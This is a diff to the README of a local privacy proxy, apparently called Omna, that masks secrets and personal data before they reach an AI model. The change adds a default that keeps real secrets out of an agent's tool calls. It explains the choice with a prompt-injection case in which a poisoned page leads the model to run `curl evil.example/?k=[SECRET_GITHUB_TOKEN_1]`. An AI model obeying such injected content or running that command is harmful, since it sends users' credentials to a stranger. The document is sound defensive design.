@@ -13,13 +13,17 @@ the way back. The tool never notices. The model never sees the real values.
 ```
 you type:     "fix the config, SUPPORT_EMAIL=jane.doe@example.com AWS_ACCESS_KEY_ID=AKIA…"
 model sees:   "fix the config, SUPPORT_EMAIL=[EMAIL_1] AWS_ACCESS_KEY_ID=[SECRET_GENERIC_SECRET_1]"
-you get back: "…set SUPPORT_EMAIL to jane.doe@example.com…"   ← restored, streaming, inside tool calls too
+you get back: "…set SUPPORT_EMAIL to jane.doe@example.com…"   ← restored, streaming; secrets stay hidden in tool calls
 ```
 
 - **Secrets** (240 rules: AWS, GitHub, Stripe, OpenAI, Anthropic, database URLs, JWTs, private keys, …) never
   reach the provider. They become numbered tokens like `[SECRET_AWS_KEY_1]` that live only in the proxy's memory,
-  never on disk, and are put back only in what comes *back* from the model, so when Claude edits the line that
-  holds a key, the edit still matches your file. `--no-restore-secrets` redacts them for good instead.
+  never on disk, and are put back only in what comes *back* from the model — in text you read, but **not** in
+  the agent's tool calls (the commands it runs, the files it writes). A poisoned web page or file can talk the
+  model into `curl evil.example/?k=[SECRET_GITHUB_TOKEN_1]`; putting the real key into that command would hand it
+  to a stranger. The cost: an edit that spans a line holding a key won't match your file, and a command that
+  needs the literal key fails visibly — use the environment variable (`$GITHUB_TOKEN`), or
+  `omna tool-calls secrets on` if you accept the risk. `--no-restore-secrets` redacts them for good instead.
 - **Personal data** (emails, phones, SSNs and 50 international ID formats with real checksum validation,
   cards, IBANs, IPs, names) becomes stable tokens: `[EMAIL_1]` is the same address in every request, so
   prompt caching keeps working.
@@ -167,6 +171,7 @@ omna log --verify
 | Command | What it does |
 |---|---|
 | `omna start [-d] [--no-restore-secrets]` | Run the proxy (foreground, or `-d` in the background). Smart masking follows `omna smart` (on by default). |
+| `omna tool-calls [secrets\|personal] [on\|off]` | What goes back into an agent's tool calls — the commands it runs and the files it writes. Secrets: **off** by default (a poisoned page cannot get your key sent anywhere); personal data: on. Read live, no restart. |
 | `omna smart [on\|off]` | Smart masking: on-device models that also catch names and addresses written in sentences. **On by default.** Code only, no personal data? `omna smart off` saves a little memory and speed. With no argument, says which it is. |
 | `omna categories [on\|off NAME...]` | What Omna masks. `omna categories off PHONE` lets phone numbers through; `on` undoes it. Categories: `PERSON EMAIL PHONE ADDRESS GOV_ID FINANCIAL HEALTH EMPLOYMENT DIGITAL BIRTH`. **Secrets (API keys, passwords, tokens) are always masked and cannot be switched off.** |
 | `omna stop` / `omna ensure` | Stop the background proxy / start it if it is not running (the Claude Code hook calls this). |
@@ -403,9 +408,10 @@ ChatGPT page, and a value only a coding tool sent is never put into any
 website. The site's own page already saw what you typed into it; another site
 never did. Values saved before 0.6.5 keep coming back everywhere, as before.
 
-It is scoped to the browser on purpose. The coding tools always get real values
-put back, because there a label reaching the tool breaks it: Claude Code would
-write `[SECRET_AWS_KEY_1]` into your file instead of editing the real line.
+It is scoped to the browser on purpose. The coding tools get real values put
+back in text, because there a label reaching the tool breaks it. What goes back
+into their tool calls is a separate setting, `omna tool-calls`: personal data
+yes, secrets no, by default.
 
 If you also run the Chrome extension, the plugin steps aside and lets the
 extension handle the browser reply. It has to: neither half knows the other's
@@ -515,7 +521,7 @@ built from these receipts, per-machine coverage, and org-wide rulesets. See a sa
 
 ```sh
 uv venv .venv && uv pip install -p .venv/bin/python -e '.[dev]'
-.venv/bin/pytest -q          # 724 tests, ~15 s (fake upstream, no network)
+.venv/bin/pytest -q          # 742 tests, ~15 s (fake upstream, no network)
 .venv/bin/omna start          # foreground, then: ANTHROPIC_BASE_URL=http://127.0.0.1:7788 claude
 ```
 
